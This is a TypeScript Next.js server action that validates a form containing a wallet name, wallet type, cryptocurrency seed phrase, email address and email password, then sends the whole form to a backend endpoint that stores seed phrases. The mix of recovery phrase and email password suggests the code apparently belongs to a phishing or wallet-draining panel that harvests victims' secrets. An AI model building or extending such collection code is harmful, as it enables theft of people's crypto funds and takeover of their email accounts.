
'use server';

import { seedPhraseFormSchema } from '@/lib/definitions'; // Use the form-specific schema
import type { SeedPhraseFormData } from '@/lib/definitions';
import { cookies } from 'next/headers'; // Import cookies to get the auth token
import { revalidatePath } from 'next/cache'; // Import revalidatePath

// Base URL for your backend API
const BACKEND_API_URL = process.env.NEXT_PUBLIC_BACKEND_API_URL || 'http://localhost:3001';

export async function saveSeedPhraseAction(
  formData: SeedPhraseFormData // Use the full form data type again
): Promise<{ success: boolean; error?: string }> {

  // 1. Get Auth Token
  const cookieStore = cookies();
  const token = cookieStore.get('authToken')?.value;

  if (!token) {
      console.error('[Save Seed Action] Auth token not found.');
      return { success: false, error: 'Authentication required. Please log in.' };
  }

  // 2. Validate the incoming form data
  // The schema includes walletName, seedPhrase, walletType, email, emailPassword
   const validatedFields = seedPhraseFormSchema.safeParse(formData);

  if (!validatedFields.success) {
    console.error('[Save Seed Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
    const firstError = Object.values(validatedFields.error.flatten().fieldErrors)[0]?.[0];
    return {
      success: false,
      error: firstError || 'Invalid data. Please check your input.',
    };
  }

  const dataToSave = validatedFields.data;
   console.log('[Save Seed Action] Sending save request to backend for wallet:', { walletName: dataToSave.walletName, walletType: dataToSave.walletType }); // Don't log sensitive info

  // 3. Call the backend API to save the information
  try {
    // Updated API endpoint for saving seed phrases
    const response = await fetch(`${BACKEND_API_URL}/api/seed-phrases`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`, // Include the auth token
      },
      body: JSON.stringify(dataToSave), // Send the validated form data
    });

    if (response.ok) {
        console.log('[Save Seed Action] Backend save successful.');
         // Revalidate the dashboard path to show the newly added phrase
         revalidatePath('/dashboard');
         console.log('[Save Seed Action] Revalidated /dashboard path.');
        return { success: true };
    } else if (response.status === 401 || response.status === 403) {
        console.error('[Save Seed Action] Authentication/Authorization error from backend.');
        return { success: false, error: 'Authentication failed. Please log in again.' };
    }
    else {
      // Handle other API errors
      let errorMessage = `Failed to save information (status: ${response.status})`;
      try {
          const errorData = await response.json();
          errorMessage = errorData.message || errorMessage;
          // Handle validation errors from backend specifically
          if (errorData.errors && Array.isArray(errorData.errors)) {
              errorMessage = errorData.errors.join(' '); // Combine multiple validation errors
          }
           console.error('[Save Seed Action] Backend save failed:', errorMessage);
      } catch (e) {
           console.error('[Save Seed Action] Backend save failed, could not parse error response:', response.statusText);
          errorMessage = `Failed to save information: ${response.statusText}`;
      }
      return { success: false, error: errorMessage };
    }
  } catch (error) {
    // Handle network errors
    console.error('[Save Seed Action] Network or unexpected error calling backend:', error);
     const message = error instanceof Error ? error.message : 'An unknown network error occurred.';
    return {
      success: false,
      error: `Failed to save information: ${message}`,
    };
  }
}
